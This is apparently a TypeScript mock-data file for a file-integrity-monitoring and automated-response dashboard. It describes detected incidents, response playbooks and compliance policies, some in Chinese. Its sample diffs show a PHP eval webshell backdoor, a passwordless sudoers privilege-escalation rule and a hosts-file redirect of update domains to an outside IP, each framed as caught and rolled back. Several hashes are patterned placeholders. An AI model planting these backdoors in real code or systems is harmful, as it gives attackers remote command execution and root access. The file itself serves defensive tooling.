export interface FimEventItem {
  id: string;
  timestamp: string;
  hostName: string;
  ipAddress: string;
  assetGroup: 'Web Servers' | 'Domain Controllers' | 'Database' | 'Core Infrastructure' | 'OT Gateway';
  filePath: string;
  fileName: string;
  changeType: 'Modified' | 'Created' | 'Deleted' | 'Permission_Changed' | 'Ownership_Changed';
  severity: 'Critical' | 'High' | 'Medium' | 'Low';
  threatClassification: 'WebShell Injection' | 'Privilege Escalation Backdoor' | 'Ransomware Encryption' | 'Config Drift' | 'Legitimate Patch';
  
  // Cryptographic Forensics
  previousHashSha256?: string;
  currentHashSha256: string;
  ssdeepComparison?: string;
  sizeBeforeBytes?: number;
  sizeAfterBytes: number;
  
  // Process & User Context
  processName: string;
  processPath: string;
  pid: number;
  parentProcessName: string;
  ppid: number;
  userAccount: string;
  uid: number;
  gid: number;

  // File Content / Diff
  diffAvailable: boolean;
  diffSnippetBefore?: string;
  diffSnippetAfter?: string;
  diffSummary?: string;

  // SOAR Automation Status
  soarActionTaken: 'Auto_Rolled_Back' | 'Process_Killed_Host_Isolated' | 'Snapshot_Restored' | 'Pending_Approval' | 'Alert_Only';
  soarPlaybookName: string;
  soarExecutionTimeMs: number;
  status: 'Contained' | 'Investigating' | 'Resolved' | 'False_Positive';
  analystNotes?: string;
}

export interface FimPlaybookItem {
  id: string;
  name: string;
  category: 'Ransomware' | 'WebShell' | 'Privilege Escalation' | 'Config Reversion' | 'Compliance';
  triggerCondition: string;
  targetPaths: string[];
  executionMode: 'Fully Automated (Instant)' | 'Semi-Automated (One-Click)' | 'Manual Review';
  actionsCount: number;
  averageMttrSeconds: number;
  successRate: number;
  isActive: boolean;
  actionsList: string[];
  lastTriggered: string;
  executionHistoryCount: number;
}

export interface FimPolicyItem {
  id: string;
  name: string;
  standard: 'PCI-DSS 4.0' | 'CIS Benchmark' | 'ISO 27001' | 'IEC 62443' | 'Custom';
  description: string;
  monitoredPaths: string[];
  recursive: boolean;
  checkAttributes: {
    contentHash: boolean;
    permissions: boolean;
    ownership: boolean;
    size: boolean;
    mtime: boolean;
  };
  detectionEngine: 'Real-time eBPF / inotify' | 'Periodic Hash Crawl' | 'Auditd Subsystem';
  activeHostsCount: number;
  enabled: boolean;
}

export interface FimBaselineSnapshot {
  id: string;
  clusterName: string;
  osType: string;
  totalFilesIndexed: number;
  createdDate: string;
  hashAlgorithm: string;
  approvedBy: string;
  changeRequestTicket: string;
  status: 'Active Golden Baseline' | 'Archived' | 'Draft';
  driftCount: number;
}

export const INITIAL_FIM_EVENTS: FimEventItem[] = [
  {
    id: 'FIM-2026-9041',
    timestamp: '2026-09-07 22:31:14',
    hostName: 'web-prod-cluster-01',
    ipAddress: '192.168.10.45',
    assetGroup: 'Web Servers',
    filePath: '/var/www/html/app/Http/Controllers/AuthHelper.php',
    fileName: 'AuthHelper.php',
    changeType: 'Modified',
    severity: 'Critical',
    threatClassification: 'WebShell Injection',
    previousHashSha256: '9f83acde782103fca576912384729104fae109405829bba12984183058a9d012',
    currentHashSha256: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855',
    ssdeepComparison: '12% Similarity (Major Malicious Payload Injected)',
    sizeBeforeBytes: 4210,
    sizeAfterBytes: 5690,
    processName: 'nginx: worker process',
    processPath: '/usr/sbin/nginx',
    pid: 31204,
    parentProcessName: 'systemd',
    ppid: 1,
    userAccount: 'www-data',
    uid: 33,
    gid: 33,
    diffAvailable: true,
    diffSnippetBefore: `<?php
namespace App\\Http\\Controllers;
class AuthHelper {
    public static function verifySession($token) {
        return SessionManager::validate($token);
    }
}`,
    diffSnippetAfter: `<?php
namespace App\\Http\\Controllers;
class AuthHelper {
    public static function verifySession($token) {
        if (isset($_POST['c2_cmd'])) {
            @eval(gzinflate(base64_decode($_POST['c2_cmd'])));
            exit;
        }
        return SessionManager::validate($token);
    }
}`,
    diffSummary: '新增未授權後門函式 eval(gzinflate(base64_decode(...)))，可直接接收 POST c2_cmd 執行任意系統指令',
    soarActionTaken: 'Auto_Rolled_Back',
    soarPlaybookName: 'SOAR-PB-FIM-WEBSHELL-PURGE',
    soarExecutionTimeMs: 420,
    status: 'Contained',
    analystNotes: 'SOAR 自動比對 ZFS 本地唯讀快照並於 420ms 內復原檔案，已同步隔離觸發之 worker process PID 31204。'
  },
  {
    id: 'FIM-2026-9042',
    timestamp: '2026-09-07 22:15:08',
    hostName: 'core-bastion-linux-01',
    ipAddress: '10.200.4.12',
    assetGroup: 'Core Infrastructure',
    filePath: '/etc/sudoers',
    fileName: 'sudoers',
    changeType: 'Modified',
    severity: 'Critical',
    threatClassification: 'Privilege Escalation Backdoor',
    previousHashSha256: '2a7f51b691929ca883904e12e737194017382901238491823904819230491823',
    currentHashSha256: '7b83910294819284910283948192039481920394819203948192039481920394',
    sizeBeforeBytes: 1240,
    sizeAfterBytes: 1315,
    processName: 'python3',
    processPath: '/usr/bin/python3',
    pid: 48921,
    parentProcessName: 'sshd: user_guest',
    ppid: 48910,
    userAccount: 'root',
    uid: 0,
    gid: 0,
    diffAvailable: true,
    diffSnippetBefore: `# User privilege specification
root    ALL=(ALL:ALL) ALL
%admin  ALL=(ALL) ALL
%sudo   ALL=(ALL:ALL) ALL`,
    diffSnippetAfter: `# User privilege specification
root    ALL=(ALL:ALL) ALL
%admin  ALL=(ALL) ALL
%sudo   ALL=(ALL:ALL) ALL
guest_svc ALL=(ALL) NOPASSWD: ALL`,
    diffSummary: '遭寫入 guest_svc ALL=(ALL) NOPASSWD: ALL 免密最高提權規則',
    soarActionTaken: 'Process_Killed_Host_Isolated',
    soarPlaybookName: 'SOAR-PB-FIM-SUDOERS-IMMUTABLE',
    soarExecutionTimeMs: 890,
    status: 'Contained',
    analystNotes: 'SOAR 立即終止 SSH 連線工作階段，重設 /etc/sudoers 為基準雜湊並封鎖 guest_svc 帳號。'
  },
  {
    id: 'FIM-2026-9043',
    timestamp: '2026-09-07 21:58:30',
    hostName: 'dc-core-ad-01',
    ipAddress: '10.200.1.5',
    assetGroup: 'Domain Controllers',
    filePath: 'C:\\Windows\\System32\\drivers\\etc\\hosts',
    fileName: 'hosts',
    changeType: 'Modified',
    severity: 'High',
    threatClassification: 'Config Drift',
    previousHashSha256: '5d41402abc4b2a76b9719d911017c592b512c192038491829304918239049182',
    currentHashSha256: '9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d3e2f1a0b9c8d7e6f5a4b3c2d1e0f9a8b',
    sizeBeforeBytes: 824,
    sizeAfterBytes: 940,
    processName: 'cmd.exe',
    processPath: 'C:\\Windows\\System32\\cmd.exe',
    pid: 6112,
    parentProcessName: 'services.exe',
    ppid: 740,
    userAccount: 'NT AUTHORITY\\SYSTEM',
    uid: 0,
    gid: 0,
    diffAvailable: true,
    diffSnippetBefore: `127.0.0.1       localhost
::1             localhost`,
    diffSnippetAfter: `127.0.0.1       localhost
::1             localhost
103.145.22.18   kms.corp.internal
103.145.22.18   update.microsoft.com`,
    diffSummary: '內部 Windows 升級網址遭 DNS 挾持導向至外部非信任未知 IP 103.145.22.18',
    soarActionTaken: 'Auto_Rolled_Back',
    soarPlaybookName: 'SOAR-PB-FIM-WIN-HOSTS-LOCK',
    soarExecutionTimeMs: 650,
    status: 'Resolved',
    analystNotes: '自動復原原生 hosts 檔案並將目標外部 IP 加入周邊防火牆阻斷清單。'
  },
  {
    id: 'FIM-2026-9044',
    timestamp: '2026-09-07 21:12:05',
    hostName: 'plc-gateway-02',
    ipAddress: '172.16.80.20',
    assetGroup: 'OT Gateway',
    filePath: '/opt/siemens/s7comm/firmware_kernel.bin',
    fileName: 'firmware_kernel.bin',
    changeType: 'Modified',
    severity: 'Critical',
    threatClassification: 'Ransomware Encryption',
    previousHashSha256: '11223344556677889900aabbccddeeff00112233445566778899aabbccddeeff',
    currentHashSha256: 'ffeeddccbbaa99887766554433221100ffeeddccbbaa99887766554433221100',
    sizeBeforeBytes: 10485760,
    sizeAfterBytes: 10486016,
    processName: 'unknown_binary',
    processPath: '/tmp/.x11_elf',
    pid: 19804,
    parentProcessName: 'sh',
    ppid: 19800,
    userAccount: 'root',
    uid: 0,
    gid: 0,
    diffAvailable: false,
    diffSummary: '韌體二進位檔頭 (ELF Magic Header) 遭非預期資料覆寫，高熵值特徵偵測可能為勒索加密活動',
    soarActionTaken: 'Snapshot_Restored',
    soarPlaybookName: 'SOAR-PB-FIM-OT-FIRMWARE-SAFEGUARD',
    soarExecutionTimeMs: 1120,
    status: 'Contained',
    analystNotes: '觸發工控 IEC 62443 安全防護劇本，阻斷 OT 網段對外串流並切換至唯讀備援核心韌體。'
  },
  {
    id: 'FIM-2026-9045',
    timestamp: '2026-09-07 20:44:19',
    hostName: 'db-master-pg',
    ipAddress: '192.168.10.12',
    assetGroup: 'Database',
    filePath: '/etc/postgresql/15/main/pg_hba.conf',
    fileName: 'pg_hba.conf',
    changeType: 'Modified',
    severity: 'Medium',
    threatClassification: 'Config Drift',
    previousHashSha256: '445566778899aabbccddeeff00112233445566778899aabbccddeeff00112233',
    currentHashSha256: '778899aabbccddeeff00112233445566778899aabbccddeeff00112233445566',
    sizeBeforeBytes: 4890,
    sizeAfterBytes: 4980,
    processName: 'ansible-playbook',
    processPath: '/usr/bin/ansible-playbook',
    pid: 28011,
    parentProcessName: 'sshd: deploy_ops',
    ppid: 28001,
    userAccount: 'deploy_ops',
    uid: 1002,
    gid: 1002,
    diffAvailable: true,
    diffSnippetBefore: `# TYPE  DATABASE        USER            ADDRESS                 METHOD
local   all             postgres                                peer
host    all             all             192.168.10.0/24         scram-sha-256`,
    diffSnippetAfter: `# TYPE  DATABASE        USER            ADDRESS                 METHOD
local   all             postgres                                peer
host    all             all             192.168.10.0/24         scram-sha-256
host    all             all             192.168.20.0/24         scram-sha-256`,
    diffSummary: '增加允許來自 192.168.20.0/24 分析子網之認證連線權限',
    soarActionTaken: 'Alert_Only',
    soarPlaybookName: 'SOAR-PB-FIM-DB-BASELINE-AUDIT',
    soarExecutionTimeMs: 120,
    status: 'Resolved',
    analystNotes: '比對變更單 CR-2026-0891，確認為日常維運合法新增分析專用網段連線。'
  }
];

export const INITIAL_FIM_PLAYBOOKS: FimPlaybookItem[] = [
  {
    id: 'SOAR-PB-FIM-WEBSHELL-PURGE',
    name: 'WebShell 零延遲清除與黃金映像還原劇本',
    category: 'WebShell',
    triggerCondition: '偵測到 /var/www/** 或 C:\\inetpub\\wwwroot\\** 目錄下檔案遭寫入高危指令或未授權新增可執行檔',
    targetPaths: ['/var/www/html/**', 'C:\\inetpub\\wwwroot\\**'],
    executionMode: 'Fully Automated (Instant)',
    actionsCount: 5,
    averageMttrSeconds: 0.45,
    successRate: 99.6,
    isActive: true,
    actionsList: [
      '1. 鎖定並掛起觸發異動之 Worker Process PID',
      '2. 從唯讀黃金基線快照 (Golden Snapshot) 覆蓋復原檔案',
      '3. 取樣竄改內容並計算 SSDEEP 與 SHA256 送入威脅情報庫',
      '4. 防火牆動態阻斷發起 POST / PUT 攻擊之遠端來源 IP',
      '5. 觸發 SOC P1 即時通知與自動結案工單'
    ],
    lastTriggered: '2026-09-07 22:31:14',
    executionHistoryCount: 42
  },
  {
    id: 'SOAR-PB-FIM-SUDOERS-IMMUTABLE',
    name: '核心特權提權配置 (/etc/sudoers) 防竄改自動隔離劇本',
    category: 'Privilege Escalation',
    triggerCondition: '偵測到 /etc/sudoers 或 /etc/sudoers.d/** 出現非預期提權規則寫入',
    targetPaths: ['/etc/sudoers', '/etc/sudoers.d/**'],
    executionMode: 'Fully Automated (Instant)',
    actionsCount: 4,
    averageMttrSeconds: 0.89,
    successRate: 100,
    isActive: true,
    actionsList: [
      '1. 強制中斷目前登入之疑似提權帳號的所有 SSH/TTY 會談',
      '2. 立即將 /etc/sudoers 恢復為原廠數位簽名基準',
      '3. 對主機下發微隔離規則 (隔離外部通訊，僅保留 SOC 管理通道)',
      '4. 啟動記憶體揮發性取證 (Dump Volatile RAM)'
    ],
    lastTriggered: '2026-09-07 22:15:08',
    executionHistoryCount: 18
  },
  {
    id: 'SOAR-PB-FIM-WIN-HOSTS-LOCK',
    name: 'Windows 系統核心與 Hosts 綁架防護劇本',
    category: 'Config Reversion',
    triggerCondition: '偵測到 Windows System32\\drivers\\etc\\hosts 或登錄機碼 Run/RunOnce 遭竄改',
    targetPaths: ['C:\\Windows\\System32\\drivers\\etc\\hosts', 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run'],
    executionMode: 'Fully Automated (Instant)',
    actionsCount: 3,
    averageMttrSeconds: 0.65,
    successRate: 98.9,
    isActive: true,
    actionsList: [
      '1. 清除惡意新增之 DNS 重定向對應條目',
      '2. 刷新本機 DNS 快取 (ipconfig /flushdns)',
      '3. 對所指惡意外部 IP 自動下發 EDR 阻斷通訊黑名單'
    ],
    lastTriggered: '2026-09-07 21:58:30',
    executionHistoryCount: 29
  },
  {
    id: 'SOAR-PB-FIM-OT-FIRMWARE-SAFEGUARD',
    name: '工控 SCADA/PLC 韌體二進位防護與唯讀鎖定劇本',
    category: 'Ransomware',
    triggerCondition: '偵測到 OT 網通閘道或 SCADA 主機核心二進位檔頭覆寫或高熵加密',
    targetPaths: ['/opt/siemens/**', '/opt/modbus/**', '/var/scada/bin/**'],
    executionMode: 'Semi-Automated (One-Click)',
    actionsCount: 4,
    averageMttrSeconds: 1.12,
    successRate: 97.4,
    isActive: true,
    actionsList: [
      '1. 阻斷 OT 與外部 IT 網段之雙向通訊',
      '2. 啟動唯讀儲存切換 (Read-Only Firmware Switchover)',
      '3. 發送高優先級安全推播至工控當值主管工程師',
      '4. 產生 IEC 62443 合規緊急事件稽核紀錄'
    ],
    lastTriggered: '2026-09-07 21:12:05',
    executionHistoryCount: 7
  }
];

export const INITIAL_FIM_POLICIES: FimPolicyItem[] = [
  {
    id: 'POL-PCI-DSS-4.0-11.5',
    name: 'PCI-DSS v4.0 Requirement 11.5 關鍵系統與設定防竄改',
    standard: 'PCI-DSS 4.0',
    description: '監控所有支付持卡人資料環境 (CDE) 內之作業系統二進位檔、認證設定檔及稽核日誌。',
    monitoredPaths: ['/bin', '/sbin', '/usr/bin', '/etc/pam.d/**', '/etc/security/**', 'C:\\Windows\\System32'],
    recursive: true,
    checkAttributes: {
      contentHash: true,
      permissions: true,
      ownership: true,
      size: true,
      mtime: true
    },
    detectionEngine: 'Real-time eBPF / inotify',
    activeHostsCount: 38,
    enabled: true
  },
  {
    id: 'POL-CIS-LINUX-L1-L2',
    name: 'CIS Benchmark Linux Level 1 & 2 Critical Files',
    standard: 'CIS Benchmark',
    description: '涵蓋 Linux 核心參數、密碼雜湊庫、Sudoers、Crontab 與 SSH 主機公私金鑰。',
    monitoredPaths: ['/etc/passwd', '/etc/shadow', '/etc/group', '/etc/gshadow', '/etc/crontab', '/etc/ssh/sshd_config'],
    recursive: false,
    checkAttributes: {
      contentHash: true,
      permissions: true,
      ownership: true,
      size: true,
      mtime: true
    },
    detectionEngine: 'Real-time eBPF / inotify',
    activeHostsCount: 52,
    enabled: true
  },
  {
    id: 'POL-WEB-ANTI-WEBSHELL',
    name: 'Web Application & CMS 零信任即時 Anti-WebShell 規則',
    standard: 'Custom',
    description: '鎖定網頁目錄，針對 PHP, JSP, ASPX, Python, WAR 新增與異動實施即時 eBPF 攔截。',
    monitoredPaths: ['/var/www/html/**', 'C:\\inetpub\\wwwroot\\**'],
    recursive: true,
    checkAttributes: {
      contentHash: true,
      permissions: true,
      ownership: true,
      size: true,
      mtime: true
    },
    detectionEngine: 'Real-time eBPF / inotify',
    activeHostsCount: 24,
    enabled: true
  },
  {
    id: 'POL-IEC-62443-OT',
    name: 'IEC 62443-3-3 工控資安系統完整性監控規程',
    standard: 'IEC 62443',
    description: '工業控制系統 (ICS) 專案程式碼、PLC 配置參數與 SCADA 人機介面執行檔鎖定。',
    monitoredPaths: ['/opt/siemens/**', '/opt/rockwell/**', '/var/scada/**'],
    recursive: true,
    checkAttributes: {
      contentHash: true,
      permissions: true,
      ownership: true,
      size: true,
      mtime: true
    },
    detectionEngine: 'Periodic Hash Crawl',
    activeHostsCount: 14,
    enabled: true
  }
];

export const INITIAL_FIM_BASELINES: FimBaselineSnapshot[] = [
  {
    id: 'BASE-2026-PROD-WEB-Q3',
    clusterName: 'Web 伺服器叢集 (Nginx + PHP 8.2)',
    osType: 'Ubuntu 22.04 LTS x86_64',
    totalFilesIndexed: 68420,
    createdDate: '2026-09-01 04:00:00',
    hashAlgorithm: 'SHA-256 + SSDEEP',
    approvedBy: 'SecOps Lead (chiur@ke-la.com)',
    changeRequestTicket: 'CR-2026-0812',
    status: 'Active Golden Baseline',
    driftCount: 1
  },
  {
    id: 'BASE-2026-DC-WINDOWS-Q3',
    clusterName: 'Active Directory 網域控制站叢集',
    osType: 'Windows Server 2022 Datacenter',
    totalFilesIndexed: 114200,
    createdDate: '2026-08-25 02:30:00',
    hashAlgorithm: 'SHA-256 + Authenticode',
    approvedBy: 'Infra Architect (admin@corp.internal)',
    changeRequestTicket: 'CR-2026-0790',
    status: 'Active Golden Baseline',
    driftCount: 1
  },
  {
    id: 'BASE-2026-OT-GATEWAYS-Q3',
    clusterName: '工控產線 PLC 與 SCADA 閘道節點',
    osType: 'Debian RT Embedded / RTOS',
    totalFilesIndexed: 24890,
    createdDate: '2026-08-15 00:00:00',
    hashAlgorithm: 'SHA-256 + Merkle Tree',
    approvedBy: 'OT Security Lead (ics-ops@corp.internal)',
    changeRequestTicket: 'CR-2026-0711',
    status: 'Active Golden Baseline',
    driftCount: 1
  }
];
